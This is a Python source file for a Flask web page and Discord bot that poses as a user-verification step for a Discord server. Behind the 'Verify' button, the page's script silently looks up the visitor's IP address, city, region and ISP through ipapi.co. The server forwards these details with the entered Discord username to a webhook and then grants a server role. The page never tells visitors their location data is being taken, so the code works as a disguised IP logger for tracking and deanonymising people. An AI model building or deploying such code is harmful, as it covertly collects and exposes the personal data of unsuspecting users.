from flask import Flask, request, jsonify
import threading
import discord
from discord.ext import commands
import os
import requests
import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html>
<head>
  <title>Verifying</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      font-size: 1.5em;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    input, button {
      font-size: 1em;
      padding: 10px;
      margin-top: 20px;
    }
    .fade {
      animation: fade 1s ease-in-out infinite alternate;
    }
    @keyframes fade {
      from { opacity: 0.4; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div id="status" class="fade">Verifying</div>
  <input id="discord" placeholder="Enter your Discord username (e.g. user#1234)">
  <button onclick="submit()">Verify</button>

  <script>
    function submit() {
      let discord = document.getElementById("discord").value;

      fetch("https://ipapi.co/json")
        .then(res => res.json())
        .then(data => {
          fetch("/send_verification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ip: data.ip,
              city: data.city,
              region: data.region,
              org: data.org,
              discord_username: discord
            })
          });
        });
    }
  </script>
</body>
</html>
'''

@app.route('/send_verification', methods=['POST'])
def send_verification():
    data = request.json
    if not data or "discord_username" not in data:
        return jsonify({"error": "Missing data"}), 400

    embed = {
        "title": "User Verified",
        "color": 0x00ff00,
        "fields": [
            {"name": "IP Address", "value": data.get("ip", "N/A"), "inline": False},
            {"name": "City", "value": data.get("city", "Unknown"), "inline": True},
            {"name": "Region", "value": data.get("region", "Unknown"), "inline": True},
            {"name": "ISP", "value": data.get("org", "N/A"), "inline": False},
            {"name": "Discord Username", "value": data.get("discord_username", "Unknown"), "inline": False}
        ],
        "footer": {"text": "Verifier"},
        "timestamp": datetime.datetime.utcnow().isoformat()
    }

    payload = {"embeds": [embed]}

    webhook_url = os.environ.get("WEBHOOK_URL")
    if not webhook_url:
        return jsonify({"error": "Webhook URL not configured"}), 500

    requests.post(webhook_url, json=payload)

    # Store the username for role assignment
    username_queue.append(data["discord_username"])

    return jsonify({"success": True})

# Discord bot config
TOKEN = os.environ.get("BOT_TOKEN")
GUILD_ID = 1372249421726617662
ROLE_ID = 1379465811110137969  # Use ID directly

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

username_queue = []

@bot.event
async def on_ready():
    print(f"Bot ready as {bot.user}")

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("Guild not found.")
        return

    while True:
        if username_queue:
            username = username_queue.pop(0)
            if "#" in username:
                name, discriminator = username.split("#")
                member = discord.utils.get(guild.members, name=name, discriminator=discriminator)
                if member:
                    role = guild.get_role(ROLE_ID)
                    if role:
                        try:
                            await member.add_roles(role)
                            print(f"Gave role to {member}")
                        except Exception as e:
                            print(f"Failed to give role: {e}")
                    else:
                        print("Role not found")
                else:
                    print(f"User {username} not found")
        await discord.utils.sleep_until(datetime.datetime.utcnow() + datetime.timedelta(seconds=2))

def run_bot():
    bot.run(TOKEN)

# Start Discord bot in a separate thread
threading.Thread(target=run_bot).start()

# Run Flask app
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
